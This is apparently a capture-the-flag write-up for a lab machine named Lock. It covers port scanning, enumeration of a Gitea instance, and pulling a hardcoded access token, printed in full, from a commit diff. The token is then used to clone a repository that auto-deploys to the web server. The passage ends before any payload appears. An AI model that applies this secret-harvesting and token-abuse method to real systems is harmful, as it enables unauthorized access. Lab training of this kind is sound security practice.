Target : 10.129.1.185 

Date : 22/05/2026

```bash
>  echo "10.129.1.185 lock.htb" | sudo tee -a /etc/hosts
Please touch the FIDO authenticator.
10.129.1.185 lock.htb
>  nmap -Pn -sS -sV -sC -O -p- --min-rate=3000 -T4 10.129.1.185
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-22 09:16 +0200
Nmap scan report for lock.htb (10.129.1.185)
Host is up (0.072s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Lock - Index
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds?
3000/tcp open  http          Golang net/http server
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=ce3d2105040cd9ce; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=Em6jbwJU7jZIwU3dcuCdiGI9sy06MTc3OTQzNDI2NzMyMDExODQwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 22 May 2026 07:17:48 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=4782e8454d5a16a9; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=e_p-WkAz4cMS8Lx_enCSbj0pNKY6MTc3OTQzNDI2ODk3MzU0NzMwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 22 May 2026 07:17:48 GMT
|_    Content-Length: 0
|_http-title: Gitea: Git with a cup of tea
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Lock
| Not valid before: 2026-05-21T07:14:47
|_Not valid after:  2026-11-20T07:14:47
| rdp-ntlm-info: 
|   Target_Name: LOCK
|   NetBIOS_Domain_Name: LOCK
|   NetBIOS_Computer_Name: LOCK
|   DNS_Domain_Name: Lock
|   DNS_Computer_Name: Lock
|   Product_Version: 10.0.20348
|_  System_Time: 2026-05-22T07:18:16+00:00
|_ssl-date: 2026-05-22T07:18:56+00:00; +3s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.99%I=7%D=5/22%Time=6A100318%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,3000,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:
SF:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nConte
SF:nt-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gitea=
SF:ce3d2105040cd9ce;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie
SF::\x20_csrf=Em6jbwJU7jZIwU3dcuCdiGI9sy06MTc3OTQzNDI2NzMyMDExODQwMA;\x20P
SF:ath=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Option
SF:s:\x20SAMEORIGIN\r\nDate:\x20Fri,\x2022\x20May\x202026\x2007:17:48\x20G
SF:MT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-
SF:auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=device
SF:-width,\x20initial-scale=1\">\n\t<title>Gitea:\x20Git\x20with\x20a\x20c
SF:up\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"data:app
SF:lication/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYS
SF:IsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfd
SF:XJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8v
SF:bG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmc
SF:iLCJzaXplcyI6IjU")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(HTTPOptions,1A4,"HTTP/1\.0\x20405\x20Metho
SF:d\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x20GE
SF:T\r\nCache-Control:\x20max-age=0,\x20private,\x20must-revalidate,\x20no
SF:-transform\r\nSet-Cookie:\x20i_like_gitea=4782e8454d5a16a9;\x20Path=/;\
SF:x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csrf=e_p-WkAz4cMS8Lx_en
SF:CSbj0pNKY6MTc3OTQzNDI2ODk3MzU0NzMwMA;\x20Path=/;\x20Max-Age=86400;\x20H
SF:ttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20
SF:Fri,\x2022\x20May\x202026\x2007:17:48\x20GMT\r\nContent-Length:\x200\r\
SF:n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent
SF:-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n4
SF:00\x20Bad\x20Request");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-05-22T07:18:18
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 2s, deviation: 0s, median: 2s
```

There is a Gitea web application running on port 3000, http on port 80 (is it the same ?) and a Windows RDP running on port 3389 with the hostname Lock.

```bash
>  curl -sI http://lock.htb:3000/login  
HTTP/1.1 404 Not Found  
Cache-Control: max-age=0, private, must-revalidate, no-transform  
Content-Type: text/plain;charset=utf-8  
Set-Cookie: i_like_gitea=61e45cef546d68d5; Path=/; HttpOnly; SameSite=Lax  
Set-Cookie: _csrf=R_HVoWkX4NCxxNbpe0zKuztt2ts6MTc3OTQzNDU3MTY2MDg5ODgwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax  
X-Content-Type-Options: nosniff  
X-Frame-Options: SAMEORIGIN  
Date: Fri, 22 May 2026 07:22:51 GMT  
Content-Length: 11
>  curl -sL http://lock.htb/ | head -80  
<!DOCTYPE html>  
<html lang="en">  
  
<head>  
 <meta charset="utf-8">  
 <meta content="width=device-width, initial-scale=1.0" name="viewport">  
  
 <title>Lock - Index</title>  
 <meta content="" name="description">  
 <meta content="" name="keywords">  
  
 <!-- Favicons -->  
 <link href="assets/img/favicon.png" rel="icon">  
 <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">  
  
 <!-- Google Fonts -->  
 <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel  
="stylesheet">  
  
 <!-- Vendor CSS Files -->  
 <link href="assets/vendor/aos/aos.css" rel="stylesheet">  
 <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">  
 <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">  
 <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">  
 <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">  
 <link href="assets/vendor/remixicon/remixicon.css" rel="stylesheet">  
 <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">  
  
 <!-- Template Main CSS File -->  
 <link href="assets/css/style.css" rel="stylesheet">  
  
 <!-- =======================================================  
 * Template Name: Gp  
 * Updated: Nov 25 2023 with Bootstrap v5.3.2  
 * Template URL: https://bootstrapmade.com/gp-free-multipurpose-html-bootstrap-template/  
 * Author: BootstrapMade.com  
 * License: https://bootstrapmade.com/license/  
 ======================================================== -->  
</head>  
  
<body>  
  
 <!-- ======= Header ======= -->  
 <header id="header" class="fixed-top ">  
   <div class="container d-flex align-items-center justify-content-lg-between">  
  
     <h1 class="logo me-auto me-lg-0"><a href="index.html">Gp<span>.</span></a></h1>  
     <!-- Uncomment below if you prefer to use an image logo -->  
     <!-- <a href="index.html" class="logo me-auto me-lg-0"><img src="assets/img/logo.png" alt="" class="img-fluid"></a>-->  
  
     <nav id="navbar" class="navbar order-last order-lg-0">  
       <ul>  
         <li><a class="nav-link scrollto active" href="#hero">Home</a></li>  
         <li><a class="nav-link scrollto" href="#about">About</a></li>  
       <i class="bi bi-list mobile-nav-toggle"></i>  
     </nav><!-- .navbar -->  
  
     <a href="#about" class="get-started-btn scrollto">Get Started</a>  
  
   </div>  
 </header><!-- End Header -->  
  
 <!-- ======= Hero Section ======= -->  
<section id="hero" class="d-flex align-items-center justify-content-center">  
 <div class="container" data-aos="fade-up">  
  
   <div class="row justify-content-center" data-aos="fade-up" data-aos-delay="150">  
     <div class="col-xl-6 col-lg-8">  
       <h1>Powerful Document Solutions With Cutting-Edge Technology<span>.</span></h1>  
     </div>  
   </div>  
  
   <div class="row gy-4 mt-5 justify-content-center" data-aos="zoom-in" data-aos-delay="250">  
     <div class="col-xl-2 col-md-4">  
       <div class="icon-box">  
         <i class="ri-file-search-line"></i>  
         <h3><a href="">PDF OCR</a></h3>  
       </div>  
     </div>  
     <div class="col-xl-2 col-md-4">  
       <div class="icon-box">
>  curl -sL http://lock.htb:3000/ | grep -iE 'explore|register|sign|repo|user'  
  
                       <a class="item" href="/explore/repos">Explore</a>  
                       <a class="item" rel="nofollow" href="/user/login?redirect_to=%2f">  
                               <svg viewBox="0 0 16 16" class="svg octicon-sign-in" aria-hidden="true" width="16" height="16"><path d="M2 2.75C2 1.784 2.784 1 3.75 1h2.5a.75.75 0 0 1 0 1.5h-2.5a.25.25 0 0 0-.2  
5.25v10.5c0 .138.112.25.25.25h2.5a.75.75 0 0 1 0 1.5h-2.5A1.75 1.75 0 0 1 2 13.25Zm6.56 4.5h5.69a.75.75 0 0 1 0 1.5H8.56l1.97 1.97a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L6.22 8.53a.75.75 0 0 1 0-1.06  
l3.25-3.25a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734Z"/></svg> Sign In
```

So we'll scan the Gitea rest API :

```bash
>  curl -s http://lock.htb:3000/api/v1/repos/search\?limit\=50 | jq .  
  
{  
 "ok": true,  
 "data": [  
   {  
     "id": 1,  
     "owner": {  
       "id": 2,  
       "login": "ellen.freeman",  
       "login_name": "",  
       "full_name": "",  
       "email": "ellen.freeman@lock.vl",  
       "avatar_url": "http://localhost:3000/avatar/1aea7e43e6bb8891439a37854255ed74",  
       "language": "",  
       "is_admin": false,  
       "last_login": "0001-01-01T00:00:00Z",  
       "created": "2023-12-27T11:13:10-08:00",  
       "restricted": false,  
       "active": false,  
       "prohibit_login": false,  
       "location": "",  
       "website": "",  
       "description": "",  
       "visibility": "public",  
       "followers_count": 0,  
       "following_count": 0,  
       "starred_repos_count": 0,  
       "username": "ellen.freeman"  
     },  
     "name": "dev-scripts",  
     "full_name": "ellen.freeman/dev-scripts",  
     "description": "",  
     "empty": false,  
     "private": false,  
     "fork": false,  
     "template": false,  
     "parent": null,  
     "mirror": false,  
     "size": 29,  
     "language": "Python",  
     "languages_url": "http://localhost:3000/api/v1/repos/ellen.freeman/dev-scripts/languages",  
     "html_url": "http://localhost:3000/ellen.freeman/dev-scripts",  
     "url": "http://localhost:3000/api/v1/repos/ellen.freeman/dev-scripts",  
     "link": "",  
     "ssh_url": "ellen.freeman@localhost:ellen.freeman/dev-scripts.git",  
     "clone_url": "http://localhost:3000/ellen.freeman/dev-scripts.git",  
     "original_url": "",  
     "website": "",  
     "stars_count": 0,  
     "forks_count": 0,  
     "watchers_count": 1,  
     "open_issues_count": 0,  
     "open_pr_counter": 0,  
     "release_counter": 0,  
     "default_branch": "main",  
     "archived": false,  
     "created_at": "2023-12-27T11:17:47-08:00",  
     "updated_at": "2023-12-27T11:36:42-08:00",  
     "archived_at": "1969-12-31T16:00:00-08:00",  
     "permissions": {  
       "admin": false,  
       "push": false,  
       "pull": true  
     },  
     "has_issues": true,  
     "internal_tracker": {  
       "enable_time_tracker": true,  
       "allow_only_contributors_to_track_time": true,  
       "enable_issue_dependencies": true  
     },  
     "has_wiki": true,  
     "has_pull_requests": true,  
     "has_projects": true,  
     "has_releases": true,  
     "has_packages": true,  
     "has_actions": false,  
     "ignore_whitespace_conflicts": false,  
     "allow_merge_commits": true,  
     "allow_rebase": true,  
     "allow_rebase_explicit": true,  
     "allow_squash_merge": true,  
     "allow_rebase_update": true,  
     "default_delete_branch_after_merge": false,  
     "default_merge_style": "merge",  
     "default_allow_maintainer_edit": false,  
     "avatar_url": "",  
     "internal": false,  
     "mirror_interval": "",  
     "mirror_updated": "0001-01-01T00:00:00Z",  
     "repo_transfer": null  
   }  
 ]  
}
```

We then go on the found repository and find a python script on `http://10.129.1.185:3000/ellen.freeman/dev-scripts/src/branch/main/repos.py` :

```python
|   |
|---|
|`import requests`|
|`import sys`|
|`import os`|
||
|`def format_domain(domain):`|
|`if not domain.startswith(('http://', 'https://')):`|
|`domain = 'https://' + domain`|
|`return domain`|
||
|`def get_repositories(token, domain):`|
|`headers = {`|
|`'Authorization': f'token {token}'`|
|`}`|
|`url = f'{domain}/api/v1/user/repos'`|
|`response = requests.get(url, headers=headers)`|
||
|`if response.status_code == 200:`|
|`return response.json()`|
|`else:`|
|`raise Exception(f'Failed to retrieve repositories: {response.status_code}')`|
||
|`def main():`|
|`if len(sys.argv) < 2:`|
|`print("Usage: python script.py <gitea_domain>")`|
|`sys.exit(1)`|
||
|`gitea_domain = format_domain(sys.argv[1])`|
||
|`personal_access_token = os.getenv('GITEA_ACCESS_TOKEN')`|
|`if not personal_access_token:`|
|`print("Error: GITEA_ACCESS_TOKEN environment variable not set.")`|
|`sys.exit(1)`|
||
|`try:`|
|`repos = get_repositories(personal_access_token, gitea_domain)`|
|`print("Repositories:")`|
|`for repo in repos:`|
|`print(f"- {repo['full_name']}")`|
|`except Exception as e:`|
|`print(f"Error: {e}")`|
||
|`if __name__ == "__main__":`|
|`main()`|
```

On a commit for this script, we find modifications ;

```python
|   |
|---|
|`import requests`|
||`import sys`|
|||
||`# store this in env instead at some point`|
||`PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'`|
||`import os`|
|||
||`def format_domain(domain):`|
||`if not domain.startswith(('http://', 'https://')):`|
||`@ -28,8 +26,13 @@ def main():`|
|||
||`gitea_domain = format_domain(sys.argv[1])`|
|||
||`personal_access_token = os.getenv('GITEA_ACCESS_TOKEN')`|
||`if not personal_access_token:`|
||`print("Error: GITEA_ACCESS_TOKEN environment variable not set.")`|
||`sys.exit(1)`|
|||
||`try:`|
||`repos = get_repositories(PERSONAL_ACCESS_TOKEN, gitea_domain)`|
||`repos = get_repositories(personal_access_token, gitea_domain)`|
||`print("Repositories:")`|
||`for repo in repos:`|
||`print(f"- {repo['full_name']}")`|
|||
```

So we got a Personal Access Token from the older version of the script that has been deleted then : 43ce39bb0bd6bc489284f2905f033ca467a6362f

```bash
>  export GITEA_ACCESS_TOKEN='43ce39bb0bd6bc489284f2905f033ca467a6362f'  
python3 repos.py http://lock.htb:3000  
Repositories:  
- ellen.freeman/dev-scripts  
- ellen.freeman/website
```

```bash  
>  mkdir -p ~/htb/lock && cd ~/htb/lock  
git clone "http://${GITEA_ACCESS_TOKEN}@lock.htb:3000/ellen.freeman/website.git"  
cd website  
Cloning into 'website'...  
remote: Enumerating objects: 165, done.  
remote: Counting objects: 100% (165/165), done.  
remote: Compressing objects: 100% (128/128), done.  
remote: Total 165 (delta 35), reused 153 (delta 31), pack-reused 0  
Receiving objects: 100% (165/165), 7.16 MiB | 564.00 KiB/s, done.  
Resolving deltas: 100% (35/35), done.
>  ls  
assets  changelog.txt  index.html  readme.md
>  cat readme.md  
# New Project Website  
  
CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver%
>  cat changelog.txt  
# Changelog  
  
- Added first website version
> diff -u <(head -40 index.html 2>/dev/null || echo "no index.html") <(curl -sL http://lock.htb/ | head -40) || true  
  
--- /proc/self/fd/15    2026-05-22 09:50:48.993782780 +0200  
+++ /proc/self/fd/16    2026-05-22 09:50:48.993782780 +0200  
@@ -1,40 +1,40 @@  
-<!DOCTYPE html>  
-<html lang="en">  
-  
-<head>  
-  <meta charset="utf-8">  
-  <meta content="width=device-width, initial-scale=1.0" name="viewport">  
-  
-  <title>Lock - Index</title>  
-  <meta content="" name="description">  
-  <meta content="" name="keywords">  
-  
-  <!-- Favicons -->  
-  <link href="assets/img/favicon.png" rel="icon">  
-  <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">  
-  
-  <!-- Google Fonts -->  
-  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" re  
l="stylesheet">  
-  
-  <!-- Vendor CSS Files -->  
-  <link href="assets/vendor/aos/aos.css" rel="stylesheet">  
-  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">  
-  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">  
-  <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">  
-  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">  
-  <link href="assets/vendor/remixicon/remixicon.css" rel="stylesheet">  
-  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">  
-  
-  <!-- Template Main CSS File -->  
-  <link href="assets/css/style.css" rel="stylesheet">  
-  
-  <!-- =======================================================  
-  * Template Name: Gp  
-  * Updated: Nov 25 2023 with Bootstrap v5.3.2  
-  * Template URL: https://bootstrapmade.com/gp-free-multipurpose-html-bootstrap-template/  
-  * Author: BootstrapMade.com  
-  * License: https://bootstrapmade.com/license/  
-  ======================================================== -->  
-</head>  
-  
-<body>  
+<!DOCTYPE html>  
+<html lang="en">  
+  
+<head>  
+  <meta charset="utf-8">  
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">  
+  
+  <title>Lock - Index</title>  
+  <meta content="" name="description">  
+  <meta content="" name="keywords">  
+  
+  <!-- Favicons -->  
+  <link href="assets/img/favicon.png" rel="icon">  
+  <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">  
+  
+  <!-- Google Fonts -->  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" re  
l="stylesheet">  
+  
+  <!-- Vendor CSS Files -->  
+  <link href="assets/vendor/aos/aos.css" rel="stylesheet">  
+  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">  
+  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">  
+  <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">  
+  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">  
+  <link href="assets/vendor/remixicon/remixicon.css" rel="stylesheet">  
+  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">  
+  
+  <!-- Template Main CSS File -->  
+  <link href="assets/css/style.css" rel="stylesheet">  
+  
+  <!-- =======================================================  
+  * Template Name: Gp  
+  * Updated: Nov 25 2023 with Bootstrap v5.3.2  
+  * Template URL: https://bootstrapmade.com/gp-free-multipurpose-html-bootstrap-template/  
+  * Author: BootstrapMade.com  
+  * License: https://bootstrapmade.com/license/  
+  ======================================================== -->  
+</head>  
+  
+<body>
```

```bash
>  file index.html  
curl -sL http://lock.htb/ | diff -q - index.html && echo "byte-identical" || echo "likely CRLF or whitespace only"  
grep -i deploy readme.md  
index.html: HTML document, ASCII text  
Files - and index.html differ  
likely CRLF or whitespace only  
CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver
```

So index.html is exactly indentical to the`http://lock.htb/` page :

```bash
>  cat index.html  
<!DOCTYPE html>  
<html lang="en">  
  
<head>  
 <meta charset="utf-8">  
 <meta content="width=device-width, initial-scale=1.0" name="viewport">  
  
 <title>Lock - Index</title>  
 <meta content="" name="description">  
 <meta content="" name="keywords">  
  
 <!-- Favicons -->  
 <link href="assets/img/favicon.png" rel="icon">  
 <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">  
  
 <!-- Google Fonts -->  
 <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel  
="stylesheet">  
  
 <!-- Vendor CSS Files -->  
 <link href="assets/vendor/aos/aos.css" rel="stylesheet">  
 <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">  
 <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">  
 <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">  
 <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">  
 <link href="assets/vendor/remixicon/remixicon.css" rel="stylesheet">  
 <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">  
  
 <!-- Template Main CSS File -->  
 <link href="assets/css/style.css" rel="stylesheet">  
  
 <!-- =======================================================  
 * Template Name: Gp  
 * Updated: Nov 25 2023 with Bootstrap v5.3.2  
 * Template URL: https://bootstrapmade.com/gp-free-multipurpose-html-bootstrap-template/  
 * Author: BootstrapMade.com  
 * License: https://bootstrapmade.com/license/  
 ======================================================== -->  
</head>  
  
<body>  
  
 <!-- ======= Header ======= -->  
 <header id="header" class="fixed-top ">  
   <div class="container d-flex align-items-center justify-content-lg-between">  
  
     <h1 class="logo me-auto me-lg-0"><a href="index.html">Gp<span>.</span></a></h1>  
     <!-- Uncomment below if you prefer to use an image logo -->  
     <!-- <a href="index.html" class="logo me-auto me-lg-0"><img src="assets/img/logo.png" alt="" class="img-fluid"></a>-->  
  
     <nav id="navbar" class="navbar order-last order-lg-0">  
       <ul>  
         <li><a class="nav-link scrollto active" href="#hero">Home</a></li>  
         <li><a class="nav-link scrollto" href="#about">About</a></li>  
       <i class="bi bi-list mobile-nav-toggle"></i>  
     </nav><!-- .navbar -->  
  
     <a href="#about" class="get-started-btn scrollto">Get Started</a>  
  
   </div>  
 </header><!-- End Header -->  
  
 <!-- ======= Hero Section ======= -->  
<section id="hero" class="d-flex align-items-center justify-content-center">  
 <div class="container" data-aos="fade-up">  
  
   <div class="row justify-content-center" data-aos="fade-up" data-aos-delay="150">  
     <div class="col-xl-6 col-lg-8">  
       <h1>Powerful Document Solutions With Cutting-Edge Technology<span>.</span></h1>  
     </div>  
   </div>  
  
   <div class="row gy-4 mt-5 justify-content-center" data-aos="zoom-in" data-aos-delay="250">  
     <div class="col-xl-2 col-md-4">  
       <div class="icon-box">  
         <i class="ri-file-search-line"></i>  
         <h3><a href="">PDF OCR</a></h3>  
       </div>  
     </div>  
     <div class="col-xl-2 col-md-4">  
       <div class="icon-box">  
         <i class="ri-file-transfer-line"></i>  
         <h3><a href="">PDF to Word</a></h3>  
       </div>  
     </div>  
     <div class="col-xl-2 col-md-4">  
       <div class="icon-box">  
         <i class="ri-file-shield-2-line"></i>  
         <h3><a href="">Redact PDF</a></h3>  
       </div>  
     </div>  
     <div class="col-xl-2 col-md-4">  
       <div class="icon-box">  
         <i class="ri-water-flash-line"></i>  
         <h3><a href="">PDF Watermark</a></h3>  
       </div>         
     </div>  
     <div class="col-xl-2 col-md-4">  
       <div class="icon-box">  
         <i class="ri-shield-keyhole-line"></i>  
         <h3><a href="">PDF Protection</a></h3>  
       </div>  
     </div>  
   </div>  
  
 </div>  
</section><!-- End Hero -->  
  
  
 <main id="main">  
  
  <!-- ======= About Section ======= -->  
<section id="about" class="about">  
 <div class="container" data-aos="fade-up">  
  
   <div class="row">  
     <div class="col-lg-6 order-1 order-lg-2" data-aos="fade-left" data-aos-delay="100">  
       <img src="assets/img/about.jpg" class="img-fluid" alt="Team working on document management">  
     </div>  
     <div class="col-lg-6 pt-4 pt-lg-0 order-2 order-lg-1 content" data-aos="fade-right" data-aos-delay="100">  
       <h3>Efficient and Secure Document Management Solutions</h3>  
       <p class="fst-italic">  
         At Lock, we specialize in providing cutting-edge PDF and document management solutions to streamline your workflow and secure your data.  
       </p>  
       <ul>  
         <li><i class="ri-check-double-line"></i> Advanced PDF editing and conversion tools to enhance productivity.</li>  
         <li><i class="ri-check-double-line"></i> Robust security features to protect sensitive information.</li>  
         <li><i class="ri-check-double-line"></i> Customizable document management systems tailored to your specific needs.</li>  
       </ul>  
       <p>  
         Our team of experts is dedicated to delivering user-friendly, innovative solutions that meet the evolving needs of businesses. From document archiving to real-time collaboration, we ensure your docume  
nts are managed efficiently and securely.  
       </p>  
     </div>  
   </div>  
  
 </div>  
</section><!-- End About Section -->  
  
  
   <!-- ======= Clients Section ======= -->  
   <section id="clients" class="clients">  
     <div class="container" data-aos="zoom-in">  
  
       <div class="clients-slider swiper">  
         <div class="swiper-wrapper align-items-center">  
           <div class="swiper-slide"><img src="assets/img/clients/client-1.png" class="img-fluid" alt=""></div>  
           <div class="swiper-slide"><img src="assets/img/clients/client-2.png" class="img-fluid" alt=""></div>  
           <div class="swiper-slide"><img src="assets/img/clients/client-3.png" class="img-fluid" alt=""></div>  
           <div class="swiper-slide"><img src="assets/img/clients/client-4.png" class="img-fluid" alt=""></div>  
           <div class="swiper-slide"><img src="assets/img/clients/client-5.png" class="img-fluid" alt=""></div>  
           <div class="swiper-slide"><img src="assets/img/clients/client-6.png" class="img-fluid" alt=""></div>  
           <div class="swiper-slide"><img src="assets/img/clients/client-7.png" class="img-fluid" alt=""></div>  
           <div class="swiper-slide"><img src="assets/img/clients/client-8.png" class="img-fluid" alt=""></div>  
         </div>  
         <div class="swiper-pagination"></div>  
       </div>  
  
     </div>  
   </section><!-- End Clients Section -->  
  
   <!-- ======= Features Section ======= -->  
<section id="features" class="features">  
 <div class="container" data-aos="fade-up">  
  
   <div class="row">  
     <div class="image col-lg-6" style='background-image: url("assets/img/features.jpg");' data-aos="fade-right"></div>  
     <div class="col-lg-6" data-aos="fade-left" data-aos-delay="100">  
       <div class="icon-box mt-5 mt-lg-0" data-aos="zoom-in" data-aos-delay="150">  
         <i class="bx bx-layer"></i>  
         <h4>PDF OCR</h4>  
         <p>Efficiently convert scanned documents into editable and searchable text with our advanced Optical Character Recognition technology.</p>  
       </div>  
       <div class="icon-box mt-5" data-aos="zoom-in" data-aos-delay="150">  
         <i class="bx bx-file"></i>  
         <h4>PDF to Word</h4>  
         <p>Seamlessly convert PDF documents into editable Word formats while maintaining the original layout and formatting.</p>  
       </div>  
       <div class="icon-box mt-5" data-aos="zoom-in" data-aos-delay="150">  
         <i class="bx bx-hide"></i>  
         <h4>Redact PDF</h4>  
         <p>Secure sensitive information in your PDF documents with our reliable redaction tools, ensuring privacy and confidentiality.</p>  
       </div>  
       <div class="icon-box mt-5" data-aos="zoom-in" data-aos-delay="150">  
         <i class="bx bx-water"></i>  
         <h4>PDF Watermark</h4>  
         <p>Add customized watermarks to your PDFs for branding or copyright protection, enhancing both security and professionalism.</p>  
       </div>  
       <div class="icon-box mt-5" data-aos="zoom-in" data-aos-delay="150">  
         <i class="bx bx-lock"></i>  
         <h4>PDF Protection</h4>  
